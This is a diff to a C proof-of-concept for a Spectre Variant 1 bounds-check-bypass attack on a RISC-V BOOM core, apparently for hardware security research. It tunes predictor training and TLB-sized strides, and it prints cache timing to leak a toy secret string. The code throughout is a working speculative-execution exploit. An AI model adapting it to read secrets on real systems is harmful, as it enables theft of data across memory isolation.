@@ -1,26 +1,25 @@
 /*-------------------------------------------------------------------------------
-// This code is modified from Shawn Liu's version from https://github.com/shawn110285/side_channel_attack_on_o3_cpu/
-// Based on this paper : Kocher, Paul, et al. "Spectre attacks: Exploiting speculative execution." arXiv preprint arXiv:1801.01203 (2018).
+// This code is modified from SpecTerminator's version from https://github.com/23-cpu/SpecTerminator
 --------------------------------------------------------------------------------*/
+
+
 #include <stdio.h>
-#include <stdlib.h>
 #include <stdint.h> 
 #include "encoding.h"
 #include "cache.h"
 
-//#define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
-#define TRAIN_TIMES 16  // the predictor in SonicBoom is much more sophisticated, need more trainning
-#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
-#define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
-#define SECRET_SZ 26
+#define TRAIN_TIMES 16 // assumption is that you have a 2 bit counter in the predictor
+#define ROUNDS 1 
+#define ATTACK_SAME_ROUNDS 5 
+#define SECRET_SZ 1
 #define CACHE_HIT_THRESHOLD 50
-
-uint64_t array1_sz = 16;
-uint8_t unused1[64];
-uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
-uint8_t unused2[64];
-uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
-char* secretString = "!\"~ThisIsTheBabyBoomerTest";
+int test = 2;
+volatile uint64_t array1_sz = 16;
+volatile uint8_t unused1[64];
+volatile uint8_t array1[160] = {15,15,15,15,15,6,7,8,9,10,11,12,13,14,15,16};
+volatile uint8_t unused2[64];
+volatile uint8_t array2[256 * 4096]; //We chose the size of 4096 based on the default number of TLB entries in SmallBoomConfig
+volatile char* secretString = "h";
 
 /**
  * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
@@ -35,7 +34,6 @@ char* secretString = "!\"~ThisIsTheBabyBoomerTest";
 void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
     outValArray[0] = 0;
     outValArray[1] = 0;
-
     for (uint64_t i = 0; i < inArraySize; ++i){
         if (inArray[i] > outValArray[0]){
             outValArray[1] = outValArray[0];
@@ -50,66 +48,68 @@ void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, ui
     }
 }
 
+double a=10.0;
+double b=5;
+double c=3;
+double d=999;
+int e = 4090;
+int f = 4091;
+
 /**
  * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
  * the bounds of the array through the Spectre Variant 1 attack.
  *
  * @input idx input to be used to idx the array
  */
+#pragma GCC push_options
+#pragma GCC optimize("O1")
 void victimFunc(uint64_t idx){
-    uint8_t dummy = 2;
-
+    volatile uint8_t dummy = 2;
     // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
-    array1_sz =  array1_sz << 4;
+    array1_sz =  array1_sz << 8;
     asm("fcvt.s.lu	fa4, %[in]\n"
         "fcvt.s.lu	fa5, %[inout]\n"
         "fdiv.s	fa5, fa5, fa4\n"
         "fdiv.s	fa5, fa5, fa4\n"
         "fdiv.s	fa5, fa5, fa4\n"
         "fdiv.s	fa5, fa5, fa4\n"
+        "fdiv.s	fa5, fa5, fa4\n"
+        "fdiv.s	fa5, fa5, fa4\n"
+        "fdiv.s	fa5, fa5, fa4\n"
+        "fdiv.s	fa5, fa5, fa4\n"
         "fcvt.lu.s	%[out], fa5, rtz\n"
-        : [out] "=r" (array1_sz)
+	: [out] "=r" (array1_sz)
         : [inout] "r" (array1_sz), [in] "r" (dummy)
         : "fa4", "fa5");
-
+        
     if (idx < array1_sz){
-        dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
+        int x = array1[idx];
+        array2[x*4096] = 1;  //We chose the size of 4096 based on the default number of TLB entries in SmallBoomConfig
+	array2[x*(e+6)] = 2;
+	array2[x*(f+5)] = 3;
     }
 
     // bound speculation here just in case it goes over
     dummy = rdcycle();
 }
+#pragma GCC pop_options
 
 int main(void){
-    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
-    uint64_t start, diff, passInIdx, randIdx;
-    uint8_t dummy = 0;
-    static uint64_t results[256];
-    // FILE *fp = fopen("hit_time_data.csv", "w+");
-    //     if (fp == NULL) {
-    //         fprintf(stderr, "fopen() failed.\n");
-    //         exit(EXIT_FAILURE);
-    //     }
-    //     fprintf(fp, "Array Index,Access time(cycles)\n");
-
-    printf("================= This is a POC of spectre_v1 (Branch Condition Check Bypass) ========================= \n");
-    printf("the secret key is:%s \n", secretString);
-
+    volatile uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
+    volatile uint64_t start, diff, passInIdx, randIdx;
+    volatile uint8_t dummy = 0;
+    volatile static uint64_t results[256];
+    int yy = 0;
+    
     // try to read out the secret
-    for(uint64_t len = 0; len < SECRET_SZ; ++len){
-
+    for(volatile uint64_t len = 0; len < SECRET_SZ; ++len){
         // clear results every round
-        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
+        for(volatile uint64_t cIdx = 0; cIdx < 256; ++cIdx){
             results[cIdx] = 0;
         }
-
-        // run the attack on the same idx ATTACK_SAME_ROUNDS times
-        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
-
-            // make sure array you read from is not in the cache
-            flushCache((uint64_t)array2, sizeof(array2));
-
-            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
+        // run the attack on the same idx ATTACK_SAME_ROUNDS times    
+        for(volatile uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
+            for(volatile int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                 // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                 // avoid jumps in case those tip off the branch predictor
                 // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
@@ -119,51 +119,38 @@ int main(void){
                 passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                 passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
 
-                // set of constant takens to make the BHR be in a all taken state
-                for(uint64_t k = 0; k < 100; ++k){
+                flushCache((uint64_t)array1_sz, sizeof(array1_sz));
+                for(volatile uint64_t k = 0; k < 500; ++k){
                     asm("");
                 }
-
+                yy = rdcycle();
+                for(int i=0; i<256; i++) yy = array2[i*4096];
+                for(int i=0; i<256; i++) yy = array2[i*4096];
+                yy = rdcycle();				
                 // call function to train or attack
                 victimFunc(passInIdx);
             }
-            
-
 
             // read out array 2 and see the hit secret value
             // this is also assuming there is no prefetching
-            for (uint64_t i = 0; i < 256; ++i){
-                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
+            for (volatile int64_t i = 0; i < 256; ++i){
                 start = rdcycle();
-                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
+                dummy = array2[i * 4096];
                 diff = (rdcycle() - start);
-                //printf("%d,%d\n",i, diff);
-
-                if ( diff < CACHE_HIT_THRESHOLD ){
-                    results[i] += 1;
-
-
-                }
+                printf("%i %d ",i,diff);
             }
+            printf("\n");
+           
         }
-        
         // get highest and second highest result hit values
-        uint8_t output[2];
-        uint64_t hitArray[2];
+        volatile uint8_t output[2];
+        volatile uint64_t hitArray[2];
         topTwoIdx(results, 256, output, hitArray);
-
-        if(output[0] == (int)secretString[len] || output[1] == (int)secretString[len]) 
-        printf("\033[0;32;32mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
-        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
-                                                           hitArray[1], output[1], output[1]); 
-        else 
-        printf("\033[0;32;31mvaddr[%010p]: want(%c) : (hit-times,ASICC,char) = 1.(%lu, %d, %c) 2.(%lu, %d, %c)\033[m\n", 
-        (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], 
-                                                           hitArray[1], output[1], output[1]);  
-
+        printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
         // read in the next secret 
         ++attackIdx;
-        //printf("%s\n","stop");
     }
     return 0;
 }
+
+
